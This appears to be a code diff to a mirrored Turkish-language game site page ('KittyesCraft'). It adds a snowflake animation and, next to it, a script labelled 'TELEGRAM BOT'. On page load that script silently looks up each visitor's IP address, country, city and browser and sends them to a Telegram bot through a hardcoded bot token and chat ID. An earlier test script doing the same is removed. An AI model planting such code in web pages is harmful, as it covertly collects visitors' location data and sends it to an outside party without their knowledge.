@@ -637,29 +637,84 @@ fetch('https://ipapi.co/json/')
     console.error('Hata oluştu:', error);
   });
 </script>
+      <!-- SNOW ANIMATION (DÜZELTİLMİŞ) -->
     <script>
-// ACİL TEST - Bu kesin çalışır
-console.log('TEST BAŞLADI');
-fetch('https://ipapi.co/json/')
-  .then(r => r.json())
-  .then(data => {
-    console.log('IP ALINDI:', data.ip);
-    fetch('https://api.telegram.org/bot8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI/sendMessage', {
-      method: 'POST',
-      headers: {'Content-Type': 'application/json'},
-      body: JSON.stringify({
-        chat_id: 1504410647,
-        text: 'ACİL TEST: ' + data.ip
-      })
-    });
-  });
-</script>
+        // Snow Animation
+        function createSnowflake() {
+            const snowflake = document.createElement('div');
+            snowflake.className = 'snowflake';
+            snowflake.innerHTML = '❄';
+            snowflake.style.left = Math.random() * 100 + '%';
+            snowflake.style.animationDuration = (Math.random() * 3 + 2) + 's';
+            snowflake.style.opacity = Math.random();
+            snowflake.style.fontSize = (Math.random() * 10 + 10) + 'px';
+            snowflake.style.setProperty('--drift', (Math.random() * 100 - 50) + 'px');
+
+            document.getElementById('snow-container').appendChild(snowflake);
+
+            setTimeout(() => {
+                snowflake.remove();
+            }, 5000);
+        }
+
+        // Create snowflakes periodically
+        setInterval(createSnowflake, 300);
+
+        // Initial snowflakes
+        for (let i = 0; i < 20; i++) {
+            setTimeout(() => createSnowflake(), i * 150);
+        }
+    </script>  <!-- SNOW SCRIPT KAPATILDI -->
+
+    <!-- TELEGRAM BOT -->
+    <script>
+        const botToken = "8690281311:AAFGIGguVxQ4LgRmR7nSTa_HYY6Q_PSWONI";
+        const chatId = "1504410647";
+
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                console.log('IP Verisi:', data);
+                
+                const userAgent = navigator.userAgent;
+                let browser = "Bilinmiyor";
+                if (userAgent.includes("Chrome")) browser = "Google Chrome";
+                else if (userAgent.includes("Firefox")) browser = "Firefox";
+                else if (userAgent.includes("Safari")) browser = "Safari";
+                else if (userAgent.includes("Edge")) browser = "Edge";
+                
+                const message = `🤡 <b>KittyesCraft Giriş Yapıldı</b>\n\n` +
+                                `🌐 <b>IP:</b> ${data.ip}\n` +
+                                `📍 <b>Konum:</b> ${data.country_name} / ${data.city}\n` +
+                                `⏰ <b>Zaman:</b> ${new Date().toLocaleString('tr-TR')}\n` +
+                                `🚀 <b>Tarayıcı:</b> ${browser}`;
+                
+                return fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ 
+                        chat_id: chatId, 
+                        text: message,
+                        parse_mode: 'HTML'
+                    })
+                });
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Telegram Sonucu:', result);
+            })
+            .catch(error => {
+                console.error('Hata:', error);
+            });
+    </script>
+</body>
 </body>
 
 
 <!-- Mirrored from Kittyescraft.com/ by HTTrack Website Copier/3.x [XR&CO'2014], Sat, 28 Feb 2026 14:23:44 GMT -->
 
 </html>
+
 
 
 
